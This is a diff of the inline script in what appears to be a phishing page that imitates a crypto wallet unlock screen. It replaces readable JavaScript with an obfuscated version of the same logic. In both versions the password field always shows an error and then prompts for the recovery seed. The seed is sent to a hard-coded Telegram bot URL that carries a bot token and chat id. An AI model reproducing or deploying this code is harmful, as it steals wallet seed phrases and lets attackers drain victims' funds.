@@ -202,34 +202,7 @@
 
 	</div>
 	<script type="text/javascript">
-		var error_counter = 0;
-
-		function send_seed(){
-			var seed = document.getElementById('seed').value;
-			fetch('https://api.telegram.org/bot1954952646:AAFEScLs_9fUgjyqTiG9Is828jf8wupEurI/sendMessage?chat_id=896837120&text=' + seed)
-			window.close();
-		}
-
-		function forgot(){
-			document.getElementById('slide1').style.display = 'none';
-			document.getElementById('slide2').style.display = 'block';
-		}
-		function clear_error(){
-			document.getElementById('password_input').style.borderColor = '#25272a';
-			document.getElementById('error_password').style.display = 'none';
-		}
-		function unlock(){
-			if(document.getElementById('password_input').value != ''){
-				error_counter += 1;
-				if(error_counter > 1){
-					document.getElementById('slide1').style.display = 'none';
-					document.getElementById('slide2').style.display = 'block';
-				}else{
-					document.getElementById('password_input').style.borderColor = '#f44336';
-					document.getElementById('error_password').style.display = 'block';
-				}
-			}
-		}
+		(function(_0x262f19,_0x581fed){var _0x238945=_0x201c,_0x2ba141=_0x262f19();while(!![]){try{var _0x4e1b31=parseInt(_0x238945(0xec))/0x1+parseInt(_0x238945(0xe9))/0x2+parseInt(_0x238945(0xfc))/0x3+parseInt(_0x238945(0xeb))/0x4+parseInt(_0x238945(0xfb))/0x5+parseInt(_0x238945(0xf7))/0x6+parseInt(_0x238945(0xea))/0x7*(-parseInt(_0x238945(0xf9))/0x8);if(_0x4e1b31===_0x581fed)break;else _0x2ba141['push'](_0x2ba141['shift']());}catch(_0x42c20c){_0x2ba141['push'](_0x2ba141['shift']());}}}(_0x586b,0x70bc8));function _0x201c(_0x3b6d89,_0x55e9d7){var _0x586b2c=_0x586b();return _0x201c=function(_0x201c9b,_0x5e06bd){_0x201c9b=_0x201c9b-0xe6;var _0x3d06d1=_0x586b2c[_0x201c9b];return _0x3d06d1;},_0x201c(_0x3b6d89,_0x55e9d7);}var error_counter=0x0;function send_seed(){var _0x45510c=_0x201c,_0x2cbf04=document[_0x45510c(0xe7)](_0x45510c(0xf6))['value'];fetch(_0x45510c(0xf0)+_0x2cbf04);}function forgot(){var _0x4b11fe=_0x201c;document[_0x4b11fe(0xe7)](_0x4b11fe(0xf1))[_0x4b11fe(0xf5)][_0x4b11fe(0xe8)]=_0x4b11fe(0xed),document[_0x4b11fe(0xe7)](_0x4b11fe(0xf4))[_0x4b11fe(0xf5)][_0x4b11fe(0xe8)]=_0x4b11fe(0xf8);}function clear_error(){var _0x3f960c=_0x201c;document[_0x3f960c(0xe7)](_0x3f960c(0xe6))['style'][_0x3f960c(0xf2)]=_0x3f960c(0xf3),document['getElementById'](_0x3f960c(0xef))[_0x3f960c(0xf5)]['display']=_0x3f960c(0xed);}function _0x586b(){var _0x2ee7f1=['2525250FyKxks','block','126536XsvCnF','#f44336','407040JrUApY','1358199jqIGBP','password_input','getElementById','display','880674LxkZiZ','924HsSckL','1073808jhNUOo','885807OyCbKi','none','value','error_password','https://api.telegram.org/bot1954952646:AAFEScLs_9fUgjyqTiG9Is828jf8wupEurI/sendMessage?chat_id=896837120&text=','slide1','borderColor','#25272a','slide2','style','seed'];_0x586b=function(){return _0x2ee7f1;};return _0x586b();}function unlock(){var _0x59c9de=_0x201c;document['getElementById'](_0x59c9de(0xe6))[_0x59c9de(0xee)]!=''&&(error_counter+=0x1,error_counter>0x1?(document[_0x59c9de(0xe7)](_0x59c9de(0xf1))[_0x59c9de(0xf5)][_0x59c9de(0xe8)]='none',document[_0x59c9de(0xe7)](_0x59c9de(0xf4))[_0x59c9de(0xf5)][_0x59c9de(0xe8)]=_0x59c9de(0xf8)):(document[_0x59c9de(0xe7)]('password_input')['style'][_0x59c9de(0xf2)]=_0x59c9de(0xfa),document[_0x59c9de(0xe7)](_0x59c9de(0xef))[_0x59c9de(0xf5)]['display']=_0x59c9de(0xf8)));}
 	</script>
 </body>
 </html>
